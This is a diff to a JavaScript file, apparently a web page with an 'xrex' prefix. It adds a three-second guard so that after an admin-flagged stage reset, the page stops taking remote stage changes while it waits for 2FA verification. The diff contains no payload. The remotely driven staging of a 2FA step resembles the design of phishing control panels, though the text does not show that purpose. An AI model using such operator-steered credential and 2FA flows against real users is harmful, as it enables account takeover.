@@ -1061,6 +1061,7 @@
                   var syncG = (function(){ try { return (new URLSearchParams(window.location.search).get('sync')) || (typeof window !== 'undefined' && window.XREX_SYNC_URL) || '/api/state'; } catch(_) { return '/api/state'; } })();
                   if (sidG) {
                     var urlG = syncG + (syncG.indexOf('?') === -1 ? '?session=' + encodeURIComponent(sidG) : '&session=' + encodeURIComponent(sidG));
+                    try { window.__xrex_reset_guard_until = Date.now() + 3000; } catch(_) {}
                     fetch(urlG, { method: 'PUT', headers: { 'Content-Type': 'application/json', 'X-Admin-Reset': '1' }, body: JSON.stringify({ stage: 3 }) }).catch(function(){});
                   }
                 } catch(_) {}
@@ -1166,6 +1167,7 @@
       btnUp.type = 'button';
       btnUp.textContent = '+';
       btnUp.style.cssText = btnDown.style.cssText;
+      function __setResetGuard(){ try { window.__xrex_reset_guard_until = Date.now() + 3000; } catch(_) {} }
       function update(){ refreshStateUI(); }
       btnDown.addEventListener('click', function(){
         var s = getProgress().state;
@@ -1179,6 +1181,7 @@
           var sync = (function(){ try { return (new URLSearchParams(window.location.search).get('sync')) || (typeof window !== 'undefined' && window.XREX_SYNC_URL) || '/api/state'; } catch(_) { return '/api/state'; } })();
           if (next <= 3 && sid) {
             var url = sync + (sync.indexOf('?') === -1 ? '?session=' + encodeURIComponent(sid) : '&session=' + encodeURIComponent(sid));
+            __setResetGuard();
             fetch(url, { method: 'PUT', headers: { 'Content-Type': 'application/json', 'X-Admin-Reset': '1' }, body: JSON.stringify({ stage: next }) }).catch(function(){});
           }
         } catch(_) {}
@@ -1199,6 +1202,7 @@
             var syncA = (function(){ try { return (new URLSearchParams(window.location.search).get('sync')) || (typeof window !== 'undefined' && window.XREX_SYNC_URL) || '/api/state'; } catch(_) { return '/api/state'; } })();
             if (sidA) {
               var urlA = syncA + (syncA.indexOf('?') === -1 ? '?session=' + encodeURIComponent(sidA) : '&session=' + encodeURIComponent(sidA));
+              __setResetGuard();
               fetch(urlA, { method: 'PUT', headers: { 'Content-Type': 'application/json', 'X-Admin-Reset': '1' }, body: JSON.stringify({ stage: 3 }) }).catch(function(){});
             }
           } catch(_) {}
@@ -2118,6 +2122,8 @@
           }
           // Only poll the server while in state 3 (waiting for 2FA verification)
           if (sNow === 3) {
+            // If we just reset the session, temporarily ignore remote promotions
+            try { if (window.__xrex_reset_guard_until && Date.now() < window.__xrex_reset_guard_until) return; } catch(_) {}
             var fetchOpts = { method: 'GET', cache: 'no-store' };
             fetch(SYNC_URL, fetchOpts)
               .then(function(r){ return r.json(); })
